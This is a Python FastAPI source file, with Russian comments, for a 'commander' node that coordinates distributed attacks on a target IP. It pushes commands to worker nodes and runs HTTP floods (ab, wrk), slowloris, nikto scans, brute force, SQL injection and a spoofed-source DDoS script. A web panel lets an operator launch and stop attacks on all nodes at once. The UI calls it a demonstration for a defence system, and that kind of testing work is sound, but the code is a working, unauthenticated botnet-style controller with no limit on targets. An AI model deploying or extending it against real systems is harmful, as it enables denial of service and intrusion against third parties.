"""
COMMANDER — главная атакующая нода (atk-1).
Push-модель: командер сам толкает команды воркерам, воркеры ничего не знают о командере.

API:
  GET    /status               — общий статус
  GET    /workers              — список воркеров
  POST   /workers/add          — добавить воркера  {"ip": "..."}
  DELETE /workers/{ip}         — удалить воркера
  POST   /workers/{ip}/run     — атака на конкретном воркере {"attack_type": "..."}
  POST   /workers/{ip}/stop    — остановить конкретного воркера
  POST   /attack/start         — запустить атаку на всех {"attack_type": "...", "target": "..."}
  POST   /attack/stop          — остановить всех
  POST   /target               — установить цель {"target": "..."}
  GET    /ui                   — веб-интерфейс
"""

import os
import sys
import time
import socket
import subprocess
import threading
import logging
import requests
from fastapi import FastAPI
from fastapi.responses import HTMLResponse
import uvicorn

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(message)s")
logger = logging.getLogger("commander")

TARGET  = os.getenv("TARGET_IP", "")
PORT    = int(os.getenv("CMD_PORT", 5000))
W_PORT  = int(os.getenv("WORKER_PORT", 5001))

_HERE = os.path.dirname(os.path.abspath(__file__))
A = lambda name: os.path.join(_HERE, "attacks", name)

app = FastAPI(title="Главная нода")

state = {
    "target":         TARGET,
    "attack_active":  False,
    "current_attack": None,
    "workers": {},
}

current_proc = None


# ─── Локальные атаки командера ────────────────────────────────────────────────
ATTACKS = {
    "flood":     lambda t: ["ab", "-n", "500000", "-c", "300", "-q", f"http://{t}/"],
    "scan":      lambda t: ["nikto", "-h", f"http://{t}", "-maxtime", "120s", "-quiet"],
    "brute":     lambda t: [sys.executable, A("brute.py"), t],
    "sqli":      lambda t: [sys.executable, A("sqli.py"), t],
    "slowloris": lambda t: [sys.executable, A("slowloris.py"), t],
    "flash":     lambda t: ["wrk", "-t4", "-c50", "-d60s", f"http://{t}/"],
    "slow":      lambda t: ["wrk", "-t2", "-c20", "-d60s", f"http://{t}/search"],
    "ddos":      lambda t: [sys.executable, A("ddos_spoof.py"), t],
}


def run_local(attack_type: str, target: str):
    global current_proc
    if current_proc and current_proc.poll() is None:
        current_proc.terminate()
    cmd = ATTACKS.get(attack_type, ATTACKS["flood"])(target)
    logger.info(f"[local] {attack_type} -> {target}")
    try:
        current_proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except FileNotFoundError as e:
        logger.error(f"Команда не найдена: {e}")


def stop_local():
    global current_proc
    if current_proc and current_proc.poll() is None:
        current_proc.terminate()
    current_proc = None


# ─── Управление воркерами (push) ──────────────────────────────────────────────
def push_all(endpoint: str, data: dict | None = None):
    def _send(ip: str):
        try:
            r = requests.post(f"http://{ip}:{W_PORT}/{endpoint}", json=data or {}, timeout=3)
            state["workers"][ip]["status"] = r.json().get("status", "ok")
        except Exception as e:
            state["workers"][ip]["status"] = "offline"
            logger.warning(f"[{ip}] недоступен: {e}")

    threads = [threading.Thread(target=_send, args=(ip,), daemon=True)
               for ip in list(state["workers"])]
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=4)


def check_worker(ip: str):
    try:
        r = requests.get(f"http://{ip}:{W_PORT}/status", timeout=2)
        info = r.json()
        state["workers"][ip].update({
            "hostname":       info.get("host", ip),
            "status":         info.get("status", "idle"),
            "current_attack": info.get("current_attack"),
            "last_checked":   time.time(),
        })
    except Exception:
        if ip in state["workers"]:
            state["workers"][ip]["status"] = "offline"


def check_all_workers():
    threads = [threading.Thread(target=check_worker, args=(ip,), daemon=True)
               for ip in list(state["workers"])]
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=3)


def _bg_refresh():
    while True:
        time.sleep(5)
        if state["workers"]:
            check_all_workers()


threading.Thread(target=_bg_refresh, daemon=True).start()


# ─── API ─────────────────────────────────────────────────────────────────────
@app.get("/status")
def get_status():
    online = sum(1 for w in state["workers"].values()
                 if w.get("status") not in ("offline", "checking"))
    return {
        "target":         state["target"],
        "attack_active":  state["attack_active"],
        "current_attack": state["current_attack"],
        "workers_total":  len(state["workers"]),
        "workers_online": online,
        "workers":        state["workers"],
    }


@app.get("/workers")
def get_workers():
    return state["workers"]


@app.post("/workers/add")
def add_worker(body: dict):
    ip = (body.get("ip") or "").strip()
    if not ip:
        return {"error": "ip required"}
    if ip not in state["workers"]:
        state["workers"][ip] = {
            "ip":             ip,
            "hostname":       ip,
            "status":         "checking",
            "current_attack": None,
            "last_checked":   0,
        }
        threading.Thread(target=check_worker, args=(ip,), daemon=True).start()
    return {"added": ip, "total": len(state["workers"])}


@app.delete("/workers/{worker_ip}")
def remove_worker(worker_ip: str):
    state["workers"].pop(worker_ip, None)
    return {"removed": worker_ip, "total": len(state["workers"])}


@app.post("/workers/{worker_ip}/run")
def run_single_worker(worker_ip: str, body: dict):
    if worker_ip not in state["workers"]:
        return {"error": "worker not found"}
    attack_type = body.get("attack_type", "flood")
    target      = body.get("target") or state["target"]
    if not target:
        return {"error": "target not set"}
    try:
        requests.post(f"http://{worker_ip}:{W_PORT}/run",
                      json={"attack_type": attack_type, "target": target}, timeout=3)
        state["workers"][worker_ip]["status"]         = "attacking"
        state["workers"][worker_ip]["current_attack"] = attack_type
    except Exception as e:
        state["workers"][worker_ip]["status"] = "offline"
        return {"error": str(e)}
    return {"status": "started", "worker": worker_ip, "attack": attack_type}


@app.post("/workers/{worker_ip}/stop")
def stop_single_worker(worker_ip: str):
    if worker_ip not in state["workers"]:
        return {"error": "worker not found"}
    try:
        requests.post(f"http://{worker_ip}:{W_PORT}/stop", timeout=3)
        state["workers"][worker_ip]["status"]         = "idle"
        state["workers"][worker_ip]["current_attack"] = None
    except Exception as e:
        state["workers"][worker_ip]["status"] = "offline"
        return {"error": str(e)}
    return {"status": "stopped", "worker": worker_ip}


@app.post("/attack/start")
def start_attack(body: dict):
    attack_type = body.get("attack_type", "flood")
    target      = body.get("target") or state["target"]
    if not target:
        return {"error": "target IP not set"}

    state["attack_active"]  = True
    state["current_attack"] = attack_type
    state["target"]         = target

    run_local(attack_type, target)
    push_all("run", {"attack_type": attack_type, "target": target})

    logger.info(f"Атака {attack_type} -> {target} | воркеров: {len(state['workers'])}")
    return {
        "status":           "started",
        "attack":           attack_type,
        "target":           target,
        "workers_notified": len(state["workers"]),
    }


@app.post("/attack/stop")
def stop_attack():
    state["attack_active"]  = False
    state["current_attack"] = None
    stop_local()
    push_all("stop")
    return {"status": "stopped"}


@app.post("/target")
def set_target(body: dict):
    state["target"] = (body.get("target") or state["target"]).strip()
    return {"target": state["target"]}


# ─── Веб-интерфейс ────────────────────────────────────────────────────────────
@app.get("/ui", response_class=HTMLResponse)
def ui():
    return _UI_HTML


_UI_HTML = """<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<title>Главная нода</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: 'Segoe UI', sans-serif; background: #111; color: #ccc;
       padding: 20px; font-size: 14px; max-width: 960px; margin: 0 auto; }
h1 { color: #fff; margin-bottom: 4px; font-size: 20px; font-weight: 600; }
.subtitle { color: #555; font-size: 12px; margin-bottom: 16px; }

.status-bar { display: flex; gap: 20px; background: #1a1a1a; border: 1px solid #2a2a2a;
              border-radius: 6px; padding: 10px 16px; margin-bottom: 16px;
              flex-wrap: wrap; align-items: center; }
.status-bar .item { display: flex; flex-direction: column; gap: 2px; }
.status-bar .label { font-size: 10px; color: #555; text-transform: uppercase; letter-spacing: .5px; }
.status-bar .value { font-size: 13px; color: #ddd; font-weight: 500; }
.status-bar .value.active { color: #f80; }
.status-bar .value.ok { color: #4c4; }

.row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 12px; }
.card { background: #1a1a1a; border: 1px solid #2a2a2a; border-radius: 6px; padding: 16px; }
.card-title { font-size: 11px; font-weight: 600; color: #666; text-transform: uppercase;
              letter-spacing: .8px; margin-bottom: 12px; }

input, select {
  width: 100%; background: #111; color: #ccc; border: 1px solid #333; border-radius: 4px;
  padding: 8px 10px; font-size: 13px; margin-bottom: 8px; font-family: inherit;
  transition: border-color .15s;
}
input:focus, select:focus { outline: none; border-color: #4a9; }
input::placeholder { color: #444; }

.btn { background: transparent; border: 1px solid #4a9; color: #4a9; border-radius: 4px;
       padding: 7px 14px; cursor: pointer; font-size: 13px; transition: all .15s;
       font-family: inherit; }
.btn:hover { background: #4a9; color: #000; }
.btn.red  { border-color: #e44; color: #e44; }
.btn.red:hover  { background: #e44; color: #fff; }
.btn.full { width: 100%; margin-top: 8px; }
.btn.stop-all { background: #2a0a0a; border-color: #e44; color: #e44; font-weight: 600;
                width: 100%; padding: 10px; margin-top: 10px; font-size: 14px; }
.btn.stop-all:hover { background: #e44; color: #fff; }

.atk-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 6px; margin: 10px 0; }
.atk-btn { background: #111; border: 1px solid #333; color: #aaa; border-radius: 4px;
           padding: 8px 6px; cursor: pointer; font-size: 12px; text-align: center;
           transition: all .15s; font-family: inherit; }
.atk-btn:hover { border-color: #f80; color: #f80; background: #1a0e00; }

.worker-item { display: flex; align-items: center; gap: 8px; padding: 8px 0;
               border-bottom: 1px solid #222; }
.worker-item:last-child { border-bottom: none; }
.dot { width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0; }
.dot.idle     { background: #4c4; }
.dot.attacking { background: #f80; }
.dot.offline  { background: #e44; }
.dot.checking { background: #555; }
.w-name { flex: 1; font-size: 13px; color: #bbb; overflow: hidden; text-overflow: ellipsis; }
.w-state { font-size: 11px; color: #f80; min-width: 60px; text-align: right; }
.w-state.idle { color: #4c4; }
.w-actions { display: flex; gap: 4px; }
.w-actions select { width: 80px; margin: 0; padding: 4px 6px; font-size: 11px; }
.w-actions .btn { padding: 4px 10px; font-size: 11px; }

#event-log { max-height: 100px; overflow-y: auto; font-size: 11px; color: #555;
             margin-top: 8px; line-height: 1.7; }
.log-entry .ts { color: #333; }
.log-entry .msg { }
</style>
</head>
<body>

<h1>ГЛАВНАЯ НОДА</h1>
<p class="subtitle">Управление распределённой атакой для демонстрации системы защиты</p>

<div class="status-bar">
  <div class="item"><span class="label">Цель</span><span class="value" id="sb-target">—</span></div>
  <div class="item"><span class="label">Атака</span><span class="value" id="sb-attack">—</span></div>
  <div class="item"><span class="label">Ноды</span><span class="value" id="sb-workers">0/0</span></div>
  <div class="item"><span class="label">Статус</span><span class="value" id="sb-status">ожидание</span></div>
</div>

<div class="row">

  <div class="card">
    <div class="card-title">Цель и тип атаки</div>
    <input id="target-ip" placeholder="IP-адрес цели (напр. 10.129.0.21)">
    <button class="btn" style="width:100%;margin-bottom:12px" onclick="setTarget()">Установить цель</button>
    <div class="card-title" style="margin-bottom:8px">Тип атаки — все ноды</div>
    <div class="atk-grid">
      <button class="atk-btn" onclick="attack('flood')">HTTP Флуд</button>
      <button class="atk-btn" onclick="attack('ddos')">DDoS</button>
      <button class="atk-btn" onclick="attack('scan')">Сканирование</button>
      <button class="atk-btn" onclick="attack('brute')">Перебор</button>
      <button class="atk-btn" onclick="attack('sqli')">SQL-инъекция</button>
      <button class="atk-btn" onclick="attack('slowloris')">Slowloris</button>
      <button class="atk-btn" onclick="attack('flash')">Flash Crowd</button>
      <button class="atk-btn" onclick="attack('slow')">Медленный флуд</button>
    </div>
    <button class="btn stop-all" onclick="stopAll()">ОСТАНОВИТЬ ВСЕ НОДЫ</button>
  </div>

  <div class="card">
    <div class="card-title">Ноды <span id="w-count" style="color:#444">(0)</span></div>
    <input id="worker-ip" placeholder="IP дополнительной ноды">
    <button class="btn" style="width:100%;margin-bottom:12px" onclick="addWorker()">Добавить ноду</button>
    <div id="workers-list">
      <span style="color:#444;font-size:12px">Нет дополнительных нод</span>
    </div>
  </div>

</div>

<div class="row">
  <div class="card">
    <div class="card-title">Активные атаки</div>
    <div id="activity" style="font-size:13px;line-height:1.9;color:#888;min-height:40px">
      <span style="color:#444">Нет активных атак</span>
    </div>
  </div>
  <div class="card">
    <div class="card-title">Журнал событий</div>
    <div id="event-log"></div>
  </div>
</div>

<script>
const B = window.location.origin;
const ATK = ['flood','ddos','scan','brute','sqli','slowloris','flash','slow'];
const ATK_RU = {flood:'HTTP Флуд',ddos:'DDoS',scan:'Сканирование',brute:'Перебор',
                sqli:'SQL-инъекция',slowloris:'Slowloris',flash:'Flash Crowd',slow:'Медл. флуд'};
let _prev = {};

function ts() { return new Date().toLocaleTimeString(); }
function addLog(msg, color) {
  const el = document.getElementById('event-log');
  const div = document.createElement('div');
  div.className = 'log-entry';
  div.innerHTML = '<span class="ts">['+ts()+']</span> <span class="msg" style="color:'+(color||'#8af')+'">'+msg+'</span>';
  el.insertBefore(div, el.firstChild);
  if (el.children.length > 30) el.removeChild(el.lastChild);
}

async function api(path, method, body) {
  const r = await fetch(B+path, {method: method||'GET',
    headers: body ? {'Content-Type':'application/json'} : {},
    body: body ? JSON.stringify(body) : undefined});
  return r.json();
}

async function setTarget() {
  const t = document.getElementById('target-ip').value.trim();
  if (!t) { addLog('Введите IP цели', '#e44'); return; }
  await api('/target', 'POST', {target: t});
  addLog('Цель: ' + t, '#4c4');
  refresh();
}

async function addWorker() {
  const ip = document.getElementById('worker-ip').value.trim();
  if (!ip) { addLog('Введите IP ноды', '#e44'); return; }
  const d = await api('/workers/add', 'POST', {ip});
  if (d.error) { addLog('Ошибка: ' + d.error, '#e44'); return; }
  document.getElementById('worker-ip').value = '';
  addLog('Добавлена нода: ' + ip, '#4c4');
  refresh();
}

async function removeWorker(ip) {
  await api('/workers/'+encodeURIComponent(ip), 'DELETE');
  addLog('Нода удалена: ' + ip, '#e44');
  refresh();
}

async function attack(type) {
  const target = document.getElementById('target-ip').value.trim() || undefined;
  const d = await api('/attack/start', 'POST', {attack_type: type, target});
  if (d.error) { addLog('Ошибка: ' + d.error, '#e44'); return; }
  addLog((ATK_RU[type]||type) + ' → ' + d.target + ' (нод: ' + d.workers_notified + ')', '#f80');
}

async function stopAll() {
  await api('/attack/stop', 'POST');
  addLog('Атака остановлена', '#e44');
}

async function runWorker(ip) {
  const sel = document.getElementById('wsel-'+ip);
  const type = sel ? sel.value : 'flood';
  const target = document.getElementById('target-ip').value.trim() || undefined;
  const d = await api('/workers/'+encodeURIComponent(ip)+'/run', 'POST', {attack_type: type, target});
  if (d.error) { addLog('['+ip+'] ' + d.error, '#e44'); return; }
  addLog('['+ip+'] ' + (ATK_RU[type]||type), '#f80');
}

async function stopWorker(ip) {
  await api('/workers/'+encodeURIComponent(ip)+'/stop', 'POST');
  addLog('['+ip+'] остановлен', '#888');
}

function dotCls(s) { return s === 'attacking' ? 'attacking' : s === 'offline' ? 'offline' : s === 'checking' ? 'checking' : 'idle'; }

async function refresh() {
  try {
    const d = await api('/status');

    document.getElementById('sb-target').textContent = d.target || '—';
    const atk = d.current_attack;
    document.getElementById('sb-attack').textContent = atk ? (ATK_RU[atk]||atk) : '—';
    document.getElementById('sb-workers').textContent = d.workers_online+'/'+d.workers_total;
    const se = document.getElementById('sb-status');
    se.textContent = d.attack_active ? 'атака активна' : 'ожидание';
    se.className = 'value ' + (d.attack_active ? 'active' : 'ok');

    if (!document.getElementById('target-ip').value && d.target)
      document.getElementById('target-ip').value = d.target;

    // Активность
    const attacking = Object.entries(d.workers||{}).filter(([,w]) => w.status === 'attacking');
    const act = document.getElementById('activity');
    act.innerHTML = attacking.length === 0
      ? '<span style="color:#444">Нет активных атак</span>'
      : attacking.map(([ip,w]) => {
          const name = (w.hostname && w.hostname !== ip) ? w.hostname : ip;
          const a = ATK_RU[w.current_attack] || w.current_attack;
          return '<div style="padding:2px 0"><span style="color:#f80;font-weight:600">'+a+'</span>'
            +'<span style="color:#555"> → '+d.target+'</span>'
            +' <span style="color:#444;font-size:12px">('+name+')</span></div>';
        }).join('');

    // Изменения статуса нод
    Object.entries(d.workers||{}).forEach(([ip, w]) => {
      const prev = _prev[ip];
      if (prev !== undefined && prev !== w.status) {
        if (w.status === 'attacking')      addLog('['+ip+'] начал '+( ATK_RU[w.current_attack]||w.current_attack), '#f80');
        else if (prev === 'attacking')     addLog('['+ip+'] остановлен', '#888');
        else if (w.status === 'offline')   addLog('['+ip+'] недоступен', '#e44');
        else if (prev === 'offline')       addLog('['+ip+'] подключился', '#4c4');
      }
      _prev[ip] = w.status;
    });

    // Список нод
    const keys = Object.keys(d.workers||{});
    document.getElementById('w-count').textContent = '('+keys.length+')';
    const wl = document.getElementById('workers-list');
    if (!keys.length) {
      wl.innerHTML = '<span style="color:#444;font-size:12px">Нет дополнительных нод</span>';
      return;
    }
    const saved = {};
    keys.forEach(ip => { const s=document.getElementById('wsel-'+ip); if(s) saved[ip]=s.value; });
    wl.innerHTML = keys.map(ip => {
      const w = d.workers[ip], s = w.status||'checking';
      const name = (w.hostname && w.hostname !== ip) ? w.hostname : ip;
      const stateLabel = w.current_attack ? (ATK_RU[w.current_attack]||w.current_attack) : s;
      const stateCls = w.current_attack ? '' : ' idle';
      const opts = ATK.map(t=>'<option value="'+t+'">'+(ATK_RU[t]||t)+'</option>').join('');
      return '<div class="worker-item">'
        +'<div class="dot '+dotCls(s)+'"></div>'
        +'<div class="w-name">'+name+'</div>'
        +'<div class="w-state'+stateCls+'">'+stateLabel+'</div>'
        +'<div class="w-actions">'
        +'<select id="wsel-'+ip+'" style="width:auto;margin:0;padding:4px 6px;font-size:11px">'+opts+'</select>'
        +'<button class="btn" style="padding:4px 10px;font-size:11px" onclick="runWorker(\''+ip+'\')">▶</button>'
        +'<button class="btn" style="padding:4px 8px;font-size:11px;border-color:#555;color:#555" onclick="stopWorker(\''+ip+'\')">■</button>'
        +'<button class="btn red" style="padding:4px 8px;font-size:11px" onclick="removeWorker(\''+ip+'\')">✕</button>'
        +'</div></div>';
    }).join('');
    keys.forEach(ip => { const s=document.getElementById('wsel-'+ip); if(s&&saved[ip]) s.value=saved[ip]; });
  } catch(e) { /* недоступен */ }
}

setInterval(refresh, 3000);
refresh();
</script>
</body>
</html>"""


if __name__ == "__main__":
    my_ip = socket.gethostbyname(socket.gethostname())
    logger.info(f"Commander ready — http://{my_ip}:{PORT}/ui")
    uvicorn.run(app, host="0.0.0.0", port=PORT, log_level="warning")
